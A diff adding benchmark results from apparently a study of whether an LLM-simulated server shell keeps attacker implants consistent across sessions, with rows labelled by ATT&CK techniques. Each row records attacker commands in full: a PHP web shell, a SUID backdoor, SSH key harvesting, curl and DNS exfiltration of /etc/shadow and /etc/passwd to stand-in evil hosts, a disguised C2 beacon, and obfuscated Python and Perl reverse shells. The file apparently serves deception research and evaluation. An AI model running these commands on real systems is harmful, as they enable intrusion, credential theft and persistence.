+        "avg_kr": 1.0,
+        "avg_sfs": 0.0686,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0686,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0686,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0686,
+            "spr": 1.0,
+            "tokens": 566727,
+            "latency_ms": 437086.7,
+            "session_a_responses": [
+              {
+                "cmd": "mkdir -p /var/www/html",
+                "response": "root@prod-server-01:~$ mkdir -p /var/www/html\nroot@prod-server-01:~$",
+                "tokens": 155,
+                "latency_ms": 2457.892656326294
+              },
+              {
+                "cmd": "echo '<?php if(isset($_REQUEST[\"c\"])){system($_REQUEST[\"c\"]);} ?>' > /var/www/html/.error_handler.php",
+                "response": "root@prod-server-01:~$ echo '<?php if(isset($_REQUEST[\"c\"])){system($_REQUEST[\"c\"]);} ?>' > /var/www/html/.error_handler.php\nroot@prod-server-01:~$",
+                "tokens": 260,
+                "latency_ms": 2986.064910888672
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /var/www/html/.error_handler.php",
+                "response": "<?php if(isset($_REQUEST[\"c\"])){system($_REQUEST[\"c\"]);} ?>\nroot@prod-server-01:~$",
+                "tokens": 10227,
+                "latency_ms": 3608.8852882385254
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 18,
+        "label": "T1548.001 SUID Backdoor",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0636,
+        "avg_strict_kr": 0.0,
+        "avg_strict_sfs": 0.0,
+        "avg_spr": 0.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0636,
+            "implant_viable": false,
+            "strict_kr": 0.0,
+            "strict_sfs": 0.0,
+            "spr": 0.0,
+            "tokens": 585313,
+            "latency_ms": 471934.6,
+            "session_a_responses": [
+              {
+                "cmd": "cp /bin/bash /tmp/.rootshell",
+                "response": "cp: cannot create regular file '/tmp/.rootshell': Permission denied\nroot@prod-server-01:~$",
+                "tokens": 154,
+                "latency_ms": 2415.147542953491
+              },
+              {
+                "cmd": "chmod u+s /tmp/.rootshell",
+                "response": "chmod: cannot access '/tmp/.rootshell': No such file or directory\nroot@prod-server-01:~$",
+                "tokens": 210,
+                "latency_ms": 2721.184253692627
+              },
+              {
+                "cmd": "ls -la /tmp/.rootshell",
+                "response": "ls: cannot access '/tmp/.rootshell': No such file or directory\nroot@prod-server-01:~$",
+                "tokens": 271,
+                "latency_ms": 2618.1089878082275
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "ls -la /tmp/.rootshell",
+                "response": "ls: cannot access '/tmp/.rootshell': No such file or directory\nroot@prod-server-01:~$",
+                "tokens": 11442,
+                "latency_ms": 2451.5421390533447
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 19,
+        "label": "T1552.004 SSH Key Theft",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0668,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0668,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0668,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0668,
+            "spr": 1.0,
+            "tokens": 578028,
+            "latency_ms": 449400.4,
+            "session_a_responses": [
+              {
+                "cmd": "find /home -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
+                "response": "/home/user/.ssh/id_rsa\n/home/user/.ssh/id_ed25519\nroot@prod-server-01:/#",
+                "tokens": 176,
+                "latency_ms": 2300.097703933716
+              },
+              {
+                "cmd": "find /root -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
+                "response": "/root/.ssh/id_rsa\n/root/.ssh/id_ed25519\nroot@prod-server-01:/#",
+                "tokens": 252,
+                "latency_ms": 1929.4133186340332
+              },
+              {
+                "cmd": "cat /etc/ssh/ssh_host_rsa_key 2>/dev/null",
+                "response": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAv5q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8\nq8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q\n8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8\nq8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q\n8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8\nq8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8q8",
+                "tokens": 1091,
+                "latency_ms": 25800.193548202515
+              },
+              {
+                "cmd": "echo \"# Stolen keys logged\" > /tmp/.keys_collected",
+                "response": "root@prod-server-01:/#",
+                "tokens": 1135,
+                "latency_ms": 1972.0873832702637
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /tmp/.keys_collected",
+                "response": "# Stolen keys logged\nroot@prod-server-01:~$",
+                "tokens": 11018,
+                "latency_ms": 2494.5805072784424
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 20,
+        "label": "T1552.001 Env Var Exfil",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0698,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0698,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0698,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0698,
+            "spr": 1.0,
+            "tokens": 587576,
+            "latency_ms": 429500.9,
+            "session_a_responses": [
+              {
+                "cmd": "env",
+                "response": "SHELL=/bin/bash\nPWD=/root\nLOGNAME=root\nHOME=/root\nLANG=en_US.UTF-8\nUSER=root\nSHLVL=1\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n_=/usr/bin/env\nroot@prod-server-01:~$",
+                "tokens": 200,
+                "latency_ms": 3172.8742122650146
+              },
+              {
+                "cmd": "echo \"AWS_ACCESS_KEY=EXFILTRATED\" > /tmp/.cloud_creds",
+                "response": "root@prod-server-01:~$",
+                "tokens": 250,
+                "latency_ms": 1235.194444656372
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /tmp/.cloud_creds",
+                "response": "AWS_ACCESS_KEY=EXFILTRATED\nroot@prod-server-01:~$",
+                "tokens": 11694,
+                "latency_ms": 2934.2381954193115
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 21,
+        "label": "T1560 Data Archive",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.066,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.066,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.066,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.066,
+            "spr": 1.0,
+            "tokens": 675977,
+            "latency_ms": 454697.4,
+            "session_a_responses": [
+              {
+                "cmd": "echo \"CONFIDENTIAL DATA: user_database_dump\" > /tmp/.exfil_data",
+                "response": "root@prod-server-01:~$ echo \"CONFIDENTIAL DATA: user_database_dump\" > /tmp/.exfil_data\nroot@prod-server-01:~$",
+                "tokens": 181,
+                "latency_ms": 2466.2702083587646
+              },
+              {
+                "cmd": "echo \"tar czf - /etc/passwd /etc/shadow | base64 | curl -X POST -d @- http://exfil.evil.com/collect\" > /tmp/.exfil_scrip",
+                "response": "root@prod-server-01:~$ echo \"tar czf - /etc/passwd /etc/shadow | base64 | curl -X POST -d @- http://exfil.evil.com/collect\" > /tmp/.exfil_script.sh\nroot@prod-server-01:~$",
+                "tokens": 312,
+                "latency_ms": 2912.527322769165
+              },
+              {
+                "cmd": "chmod +x /tmp/.exfil_script.sh",
+                "response": "root@prod-server-01:~$ chmod +x /tmp/.exfil_script.sh\nroot@prod-server-01:~$",
+                "tokens": 375,
+                "latency_ms": 1714.4496440887451
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /tmp/.exfil_script.sh",
+                "response": "tar czf - /etc/passwd /etc/shadow | base64 | curl -X POST -d @- http://exfil.evil.com/collect\nroot@prod-server-01:~$",
+                "tokens": 12694,
+                "latency_ms": 3518.620014190674
+              },
+              {
+                "cmd": "cat /tmp/.exfil_data",
+                "response": "CONFIDENTIAL DATA: user_database_dump\nroot@prod-server-01:~$",
+                "tokens": 12716,
+                "latency_ms": 2724.42364692688
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 22,
+        "label": "T1071.004 DNS Tunneling",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.0704,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.0704,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.0704,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.0704,
+            "spr": 1.0,
+            "tokens": 574302,
+            "latency_ms": 426214.4,
+            "session_a_responses": [
+              {
+                "cmd": "echo \"#!/bin/bash\" > /tmp/.dns_tunnel",
+                "response": "root@prod-server-01:~$ echo \"#!/bin/bash\" > /tmp/.dns_tunnel\nroot@prod-server-01:~$",
+                "tokens": 167,
+                "latency_ms": 2332.301378250122
+              },
+              {
+                "cmd": "echo \"# DNS exfiltration via subdomain encoding\" >> /tmp/.dns_tunnel",
+                "response": "root@prod-server-01:~$ echo \"# DNS exfiltration via subdomain encoding\" >> /tmp/.dns_tunnel\nroot@prod-server-01:~$",
+                "tokens": 244,
+                "latency_ms": 2104.5281887054443
+              },
+              {
+                "cmd": "echo \"DATA=\\$(cat /etc/passwd | base64 | tr -d '\\n')\" >> /tmp/.dns_tunnel",
+                "response": "root@prod-server-01:~$ echo \"DATA=\\$(cat /etc/passwd | base64 | tr -d '\\n')\" >> /tmp/.dns_tunnel\nroot@prod-server-01:~$",
+                "tokens": 343,
+                "latency_ms": 2384.671926498413
+              },
+              {
+                "cmd": "echo \"for chunk in \\$(echo \\$DATA | fold -w 60); do nslookup \\$chunk.data.evil-dns.com; done\" >> /tmp/.dns_tunnel",
+                "response": "root@prod-server-01:~$ echo \"for chunk in \\$(echo \\$DATA | fold -w 60); do nslookup \\$chunk.data.evil-dns.com; done\" >> /tmp/.dns_tunnel\nroot@prod-server-01:~$",
+                "tokens": 464,
+                "latency_ms": 2974.2960929870605
+              },
+              {
+                "cmd": "chmod +x /tmp/.dns_tunnel",
+                "response": "root@prod-server-01:~$ chmod +x /tmp/.dns_tunnel\nroot@prod-server-01:~$",
+                "tokens": 525,
+                "latency_ms": 2279.5915603637695
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /tmp/.dns_tunnel",
+                "response": "#!/bin/bash\n# DNS exfiltration via subdomain encoding\nDATA=$(cat /etc/passwd | base64 | tr -d 'n')\nfor chunk in $(echo $DATA | fold -w 60); do nslookup $chunk.data.evil-dns.com; done\n\nroot@prod-server-01:/root$",
+                "tokens": 11114,
+                "latency_ms": 5071.491003036499
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 23,
+        "label": "T1564.001 Process Hiding",
+        "avg_kr": 1.0,
+        "avg_sfs": 0.05,
+        "avg_strict_kr": 1.0,
+        "avg_strict_sfs": 0.05,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 0.05,
+            "implant_viable": true,
+            "strict_kr": 1.0,
+            "strict_sfs": 0.05,
+            "spr": 1.0,
+            "tokens": 588769,
+            "latency_ms": 599636.5,
+            "session_a_responses": [
+              {
+                "cmd": "mkdir -p /dev/shm/.../.hidden",
+                "response": "mkdir: cannot create directory ‘/dev/shm/.../.hidden’: No such file or directory\nroot@prod-server-01:~$",
+                "tokens": 163,
+                "latency_ms": 2261.6047859191895
+              },
+              {
+                "cmd": "echo \"#!/bin/bash\" > /dev/shm/.../.hidden/rootkit.sh",
+                "response": "bash: /dev/shm/.../.hidden/rootkit.sh: No such file or directory\nroot@prod-server-01:~$",
+                "tokens": 233,
+                "latency_ms": 2247.009754180908
+              },
+              {
+                "cmd": "echo \"# Hide from ps by renaming process\" >> /dev/shm/.../.hidden/rootkit.sh",
+                "response": "bash: /dev/shm/.../.hidden/rootkit.sh: No such file or directory\nroot@prod-server-01:~$",
+                "tokens": 307,
+                "latency_ms": 2346.190929412842
+              },
+              {
+                "cmd": "echo \"exec -a '[kworker/0:1]' /bin/bash -c 'while true; do curl -s http://c2.rootkit.net/beacon; sleep 3600; done'\" >> /",
+                "response": "bash: /dev/shm/.../.hidden/rootkit.sh: No such file or directory\nroot@prod-server-01:~$",
+                "tokens": 416,
+                "latency_ms": 2265.8438682556152
+              },
+              {
+                "cmd": "chmod +x /dev/shm/.../.hidden/rootkit.sh",
+                "response": "chmod: cannot access '/dev/shm/.../.hidden/rootkit.sh': No such file or directory\nroot@prod-server-01:~$",
+                "tokens": 486,
+                "latency_ms": 2643.7463760375977
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /dev/shm/.../.hidden/rootkit.sh",
+                "response": "#!/bin/bash\n# Hide from ps by renaming process\nexec -a '[kworker/0:1]' /bin/bash -c 'while true; do curl -s http://c2.rootkit.net/beacon; sleep 3600; done'\nroot@prod-server-01:/root$",
+                "tokens": 11163,
+                "latency_ms": 4425.519704818726
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "row": 24,
+        "label": "T1059 Reverse Shell",
+        "avg_kr": 0.5,
+        "avg_sfs": 0.0347,
+        "avg_strict_kr": 0.5,
+        "avg_strict_sfs": 0.0347,
+        "avg_spr": 1.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 0.5,
+            "sfs": 0.0347,
+            "implant_viable": true,
+            "strict_kr": 0.5,
+            "strict_sfs": 0.0347,
+            "spr": 1.0,
+            "tokens": 577302,
+            "latency_ms": 431897.4,
+            "session_a_responses": [
+              {
+                "cmd": "echo 'python3 -c \"import os,socket,subprocess;s=socket.socket();s.connect((chr(49)+chr(48)+chr(46)+chr(48)+chr(46)+chr(4",
+                "response": "root@prod-server-01:~# echo 'python3 -c \"import os,socket,subprocess;s=socket.socket();s.connect((chr(49)+chr(48)+chr(46)+chr(48)+chr(46)+chr(48)+chr(46)+chr(49),5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([chr(98)+chr(97)+chr(115)+chr(104),chr(45)+chr(105)])\"' > /tmp/.py_shell\nroot@prod-server-01:~$",
+                "tokens": 395,
+                "latency_ms": 5434.0643882751465
+              },
+              {
+                "cmd": "echo 'perl -MSocket -e \"\\$p=5556;socket(S,2,1,0);connect(S,pack_sockaddr_in(\\$p,inet_aton(chr(49).chr(48).chr(46).chr(48",
+                "response": "root@prod-server-01:~# echo 'perl -MSocket -e \"\\$p=5556;socket(S,2,1,0);connect(S,pack_sockaddr_in(\\$p,inet_aton(chr(49).chr(48).chr(46).chr(48).chr(46).chr(48).chr(46).chr(49))));open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");exec(chr(98).chr(97).chr(115).chr(104))\"' > /tmp/.pl_shell\nroot@prod-server-01:~$",
+                "tokens": 670,
+                "latency_ms": 5204.913854598999
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "cat /tmp/.py_shell",
+                "response": "python3 -c \"import os,socket,subprocess;s=socket.socket();s.connect((chr(49)+chr(48)+chr(46)+chr(48)+chr(46)+chr(48)+chr(46)+chr(49),5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([chr(98)+chr(97)+chr(115)+chr(104),chr(45)+chr(105)])\"\nroot@prod-server-01:~$",
+                "tokens": 11525,
+                "latency_ms": 5545.586109161377
+              },
+              {
+                "cmd": "cat /tmp/.pl_shell",
+                "response": "perl -MSocket -e \"$p=5556;socket(S,2,1,0);connect(S,pack_sockaddr_in($p,inet_aton(chr(49).chr(48).chr(46).chr(48).chr(46).chr(48).chr(46).chr(49))));open(STDIN,\">&S\");open(STDOUT,\">&S\");exec(chr(98).chr(97).chr(115).chr(104))\"\nroot@prod-server-01:~$",
+                "tokens": 11657,
+                "latency_ms": 5984.028100967407
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  }
+}
